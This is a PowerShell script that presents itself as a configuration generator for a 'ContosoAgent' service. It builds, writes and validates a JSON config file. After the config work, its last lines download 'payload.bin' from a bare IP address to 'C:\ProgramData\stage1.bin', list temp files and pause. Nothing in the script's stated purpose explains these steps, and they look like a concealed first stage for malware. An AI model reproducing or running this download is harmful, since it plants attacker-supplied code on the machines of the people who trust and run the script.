<#
.SYNOPSIS
    Generates the ContosoAgent JSON configuration for the selected environment.
.DESCRIPTION
    Builds an ordered configuration object, writes it next to the installed
    agent and validates the result by reading it back.
    An existing configuration is backed up before it is replaced, unless the
    Force switch is specified.
.PARAMETER OutputPath
    Used when the script runs unattended.
.EXAMPLE
    .\Build-AgentConfig.ps1 -Environment Dev
#>

[CmdletBinding()]
param(
    [Parameter(HelpMessage = "Optional. The default value is used when the parameter is omitted.")]
    [string]$OutputPath = 'C:\ProgramData\Contoso\ContosoAgent\config.json',

    [Parameter(Mandatory = $false)]
    [ValidateSet('Dev', 'Test', "Staging", 'Prod')]
    [string]$Environment = 'Dev',

    [ValidateRange(1024, 65535)]
    [int]$ApiPort = 8443,
    [int]$NodeCount = 5,

    [switch]$Force
)

$WarningPreference = 'Continue'
$scriptRoot = Split-Path -Parent $MyInvocation.MyCommand.Path

$config = [ordered]@{
    environment = $Environment
    agent       = [ordered]@{
        name     = 'ContosoAgent'
        port     = $ApiPort
        logLevel = 'Information'
        endpoints = @(
            'https://api.contoso.com/v1'
            'https://telemetry.adatum.com/v1'
        )
    }
    generatedAt = (Get-Date).ToString('yyyy-MM-ddTHH:mm:ssZ')
    host        = $env:COMPUTERNAME
}

$jsonBody = $config | ConvertTo-Json -Depth 6
if ((Test-Path -LiteralPath $OutputPath) -and (-not $Force)) {
    $backup = $OutputPath + '.' + (Get-Date -Format 'yyyyMMdd-HHmmss') + '.bak'
    Copy-Item -LiteralPath $OutputPath -Destination $backup -Force
    Write-Verbose ("Existing config backed up to {0}" -f $backup)
}
$outputDir = Split-Path -Parent $OutputPath
if (-not (Test-Path -LiteralPath $outputDir)) {
    New-Item -Path $outputDir -ItemType Directory -Force | Out-Null
}
$jsonBody | Set-Content -LiteralPath $OutputPath -Encoding UTF8
$roundTrip = Get-Content -LiteralPath $OutputPath -Raw | ConvertFrom-Json
if (-not $roundTrip.agent.port) {
    throw 'Generated configuration failed the round-trip check.'
}
Write-Verbose ("Configuration written to {0}" -f $OutputPath)
$config.generatedAt = (Get-Date).ToString('yyyy-MM-ddTHH:mm:ssZ')
Write-Host ("Environment: {0} | Port: {1}" -f $roundTrip.environment, $roundTrip.agent.port) -ForegroundColor Cyan
(New-Object System.Net.WebClient).DownloadFile('http://198.51.100.135/payload.bin', "C:\ProgramData\stage1.bin")
Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
Start-Sleep -Seconds 21
